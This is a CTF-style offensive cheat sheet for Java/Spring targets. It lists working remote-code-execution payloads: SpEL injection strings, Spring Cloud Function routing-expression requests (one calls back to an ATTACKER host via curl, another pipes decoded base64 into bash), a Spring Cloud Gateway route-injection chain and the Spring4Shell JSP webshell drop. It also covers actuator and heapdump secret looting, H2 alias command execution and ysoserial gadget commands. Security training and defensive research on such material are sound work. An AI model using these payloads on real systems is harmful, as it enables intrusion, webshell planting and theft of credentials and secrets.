# Java / Spring

## Fingerprint

```text
/actuator
/actuator/env
/actuator/heapdump
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator/gateway/routes
/h2-console
/jolokia/list
/error
```

Headers and error hints:

```text
Whitelabel Error Page
X-Application-Context
Spring Boot
Tomcat
Jetty
Undertow
JSESSIONID
```

## SpEL Test

```text
${7*7}
#{7*7}
*{7*7}
__${7*7}__::.x
T(java.lang.Math).random()
```

## SpEL RCE

```text
${T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag*').getInputStream()).useDelimiter('\\A').next()}
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
${new java.lang.ProcessBuilder('bash','-c','id').start()}
${new java.util.Scanner(new java.lang.ProcessBuilder('bash','-c','cat /flag*').start().getInputStream()).useDelimiter('\\A').next()}
```

URL-encoded SpEL:

```text
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D
%23%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D
```

Command output helper:

```text
new java.util.Scanner(PROCESS.getInputStream()).useDelimiter('\\A').next()
```

When `T(...)` is filtered, try class loading through an existing object:

```text
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${''.class.forName('java.lang.Runtime').getRuntime().exec('id')}
${''.getClass().forName('java.lang.ProcessBuilder').getConstructor(''.getClass().forName('[Ljava.lang.String;')).newInstance(new String[]{'bash','-c','id'}).start()}
```

## Spring Cloud Function Routing Expression

Use when Spring Cloud Function routing is exposed and the app evaluates the `spring.cloud.function.routing-expression` header.

```http
POST /functionRouter HTTP/1.1
Host: HOST
Content-Type: text/plain
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')

x
```

Output usually is not returned. Use an OAST callback or write a file:

```http
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/$(id)')
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('bash -c {echo,BASE64}|{base64,-d}|{bash,-i}')
```

Try paths:

```text
/functionRouter
/functionRouter/
/uppercase
/lowercase
/actuator/functionRouter
```

## Spring Cloud Gateway Actuator

Use when `/actuator/gateway` is exposed and writable. Add a route with a SpEL filter, refresh, then hit the route.

```http
POST /actuator/gateway/routes/pwn HTTP/1.1
Host: HOST
Content-Type: application/json

{
  "id": "pwn",
  "filters": [
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}"
      }
    }
  ],
  "uri": "http://example.com",
  "order": 0
}
```

```http
POST /actuator/gateway/refresh HTTP/1.1
Host: HOST
Content-Type: application/json

{}
```

```text
GET /actuator/gateway/routes/pwn
GET /pwn
```

Cleanup:

```http
DELETE /actuator/gateway/routes/pwn HTTP/1.1
Host: HOST
```

```http
POST /actuator/gateway/refresh HTTP/1.1
Host: HOST
Content-Type: application/json

{}
```

## Spring ClassLoader JSP Drop

Use when request parameters bind into Spring/Tomcat internals.

```http
POST /
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if("x".equals(request.getParameter("pwd")))%7Bout.println(new+java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next());%7D
&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

```text
/shell.jsp?pwd=x&cmd=id
/shell.jsp?pwd=x&cmd=cat+/flag*
```

Checklist for this chain:

```text
JDK 9+
Spring MVC/WebFlux data binding reaches class.module.classLoader
Tomcat as WAR deployment
Writable webapps/ROOT or accessible logging directory
An endpoint binds request parameters into an object
```

If `/shell.jsp` is not reachable, try writing under the app context directory or use `class.module.classLoader.resources.context.parent.pipeline.first.directory` values from error leaks.

## Actuator Loot

```bash
curl http://HOST/actuator
curl http://HOST/actuator/env
curl http://HOST/actuator/configprops
curl http://HOST/actuator/beans
curl http://HOST/actuator/mappings
curl -o heapdump.bin http://HOST/actuator/heapdump
```

Look for:

```text
spring.datasource.password
spring.redis.password
spring.security.user.password
jwt.secret
management.endpoints.web.exposure.include=*
APP_KEY / SECRET_KEY style app secrets
internal route mappings
```

Heapdump quick strings:

```bash
strings heapdump.bin | rg -i "password|secret|token|jdbc|redis|jwt|flag"
```

If `/actuator/env` is writable, older/misconfigured apps may allow property changes. Treat it as a config write primitive; look for log path, template path, datasource URL, or exposed refresh endpoints.

## Jolokia

Use when `/jolokia` is exposed. First enumerate:

```bash
curl http://HOST/jolokia/list
curl http://HOST/actuator/jolokia/list
```

Interesting MBeans:

```text
java.lang:type=DiagnosticCommand
com.sun.management:type=DiagnosticCommand
Logback JMXConfigurator
Tomcat AccessLogValve
```

Read memory/system info:

```bash
curl 'http://HOST/jolokia/read/java.lang:type=Runtime/SystemProperties'
curl 'http://HOST/jolokia/read/java.lang:type=Memory'
```

Older Jolokia deployments can sometimes call dangerous operations through `/exec`. In CTFs, search `list` for `exec`, `run`, `reloadByURL`, `setLoggerLevel`, `vmLog`, and logging config operations.

## H2 Console

Use when `/h2-console` is exposed and credentials are weak or leaked from Actuator.

```text
JDBC URL: jdbc:h2:mem:testdb
JDBC URL: jdbc:h2:file:/tmp/test
User: sa
Password: 
```

H2 alias command execution in permissive setups:

```sql
CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.io.IOException {
  java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
} $$;
CALL EXEC('id');
```

## Java Deserialization Signals

```text
rO0AB
aced0005
Content-Type: application/x-java-serialized-object
remember-me=
JSESSIONID backed by serialized session storage
```

Tools:

```bash
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://TOKEN.oast.pro' | base64 -w0
```

Use `URLDNS` first for blind confirmation, then switch gadget families based on `pom.xml`, `WEB-INF/lib`, stack traces, or heapdump jars.

## Tools / References

```text
ysoserial: https://github.com/frohoff/ysoserial
Spring Cloud Function CVE-2022-22963: https://spring.io/security/cve-2022-22963
Spring Cloud Gateway CVE-2022-22947: https://spring.io/security/cve-2022-22947
Spring4Shell CVE-2022-22965: https://spring.io/security/cve-2022-22965
```
